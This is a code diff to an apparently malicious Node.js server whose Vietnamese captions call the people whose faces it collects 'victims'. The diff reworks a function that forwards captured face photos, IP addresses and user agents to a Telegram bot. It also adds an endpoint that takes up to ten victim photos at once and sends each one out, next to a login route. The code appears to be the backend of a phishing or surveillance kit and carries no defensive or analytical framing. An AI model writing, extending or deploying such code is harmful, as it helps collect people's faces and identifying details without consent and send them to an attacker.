@@ -57,15 +57,18 @@ async function forwardToTelegram(rec, filePath) {
       body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
 
+    // Gửi ảnh bằng base64 (không dùng Blob/FormData — chạy được Node cũ)
     if (filePath && fs.existsSync(filePath)) {
-      const fileBuf = fs.readFileSync(filePath);
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('photo', new Blob([fileBuf], { type: 'image/jpeg' }), 'victim.jpg');
-      fd.append('caption', `📸 Mặt nạn nhân — IP ${rec.ip || '?'}`);
+      const b64 = fs.readFileSync(filePath).toString('base64');
+      const dataUrl = `data:image/jpeg;base64,${b64}`;
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
-        body: fd
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: dataUrl,
+          caption: `📸 Mặt nạn nhân — IP ${rec.ip || '?'}`
+        })
       });
     }
   } catch(e) { console.log('TG fail:', e.message); }
@@ -114,6 +117,24 @@ app.post('/face', upload.single('photo'), async (req, res) => {
   console.log('📸', req.file.filename);
   forwardToTelegram(rec, req.file.path);
   res.json({ ok: true });
+});
+
+// Nhận nhiều ảnh 1 lần
+app.post('/face-multi', upload.array('photos', 10), async (req, res) => {
+  if (!req.files || !req.files.length) return res.status(400).json({ ok: false });
+  const ip = getClientIP(req);
+  for (const f of req.files) {
+    const rec = {
+      time: new Date().toISOString(),
+      ip,
+      ua: req.headers['user-agent'],
+      face: f.filename
+    };
+    await safeAppend(rec);
+    console.log('📸 multi', f.filename);
+    forwardToTelegram(rec, f.path);
+  }
+  res.json({ ok: true, count: req.files.length });
 });
 
 app.post('/api/login', (req, res) => {
